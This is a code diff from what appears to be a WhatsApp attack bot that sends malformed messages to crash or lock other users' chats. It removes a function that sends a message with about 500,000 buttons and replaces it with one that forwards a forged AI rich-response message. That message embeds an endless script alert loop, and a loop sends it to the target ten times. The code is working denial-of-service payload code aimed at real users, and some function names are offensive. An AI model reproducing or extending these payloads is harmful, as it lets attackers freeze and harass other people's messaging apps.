@@ -1499,63 +1499,47 @@ async function delayhard(sock, target) {
     });
 }
 
-async function StuckLogoLockChat(sock, target) {
-  try {
-    const payload = {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "JavaScript",
-              hasMediaAttachment: false
-            },
-            body: {
-              text: "LOCK CHAT BY KINTANA"
-            },
-            nativeFlowMessage: {
-              messageParamsJson: JSON.stringify({
-                placeholderResendMessage: "placeholderResendMessage",
-                testPayload: Buffer.from(
-                  Array.from({ length: 1500 }, () => 0x5A)
-                ).toString("base64")
-              }),
-              buttons: Array.from({ length: 500550 }, (_, i) => {
-                if (i === 0) {
-                  return {
-                    name: "quick_reply",
-                    buttonParamsJson: JSON.stringify({
-                      display_text: "Oke",
-                      id: "oke_btn"
-                    })
-                  };
+async function emmalocalautism(sock, target) {
+  const crypto = require("crypto");
+  const em  = {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          unifiedResponse: {
+            data: Buffer.from(JSON.stringify({
+            __typename: "GenAIUnifiedResponse",
+            response_id: crypto.randomUUID(),
+            sections: [{
+                __typename: "GenAIUnifiedResponseSection",
+                view_model: {
+                  __typename: "GenAISingleLayoutViewModel",
+                  primitive: {
+                    __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
+                    trusted_sources: [],
+                    payload: `<script>
+                      while (true) {
+                        alert("Group gooning start in 10 minutes");
+                      }
+                    </script>`
+                  }
                 }
-                return {};
-              }),
-              messageVersion: 3
-            },
-            contextInfo: {
-              forwardingScore: 999,
-              isForwarded: true,
-              isAiGenerated: true,
-              businessMessageForwardInfo: {
-                businessOwnerJid: "13135550002@s.whatsapp.net"
-              }
-            }
+              }]
+            })).toString("base64")
+          },
+          contextInfo: {
+            isForwarded: true,
+            forwardOrigin: 4
           }
         }
       }
-    };
-
-    await sock.relayMessage(target, payload, {
-      participant: true,
-      noSelfSync: true,
-      messageId: "3EB0" + Math.random().toString(36).substring(2, 12).toUpperCase()
-    });
-
-    console.log(`[+] Meta AI Lock Chat Overlay terkirim ke ${target}`);
-  } catch (err) {
-    console.error("[-] Gagal kirim:", err.message);
+    }
   }
+  const msg = generateWAMessageFromContent(target, em, {})
+
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id
+  });
 }
 
 async function halonyet(sock, target) {
@@ -1799,7 +1783,7 @@ async function bug1(sock, target) {
 async function bug2(sock, target) {
   for (let i = 0; i < 10; i++) {
     try {
-      await StuckLogoLockChat(sock, target);
+      await emmalocalautism(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
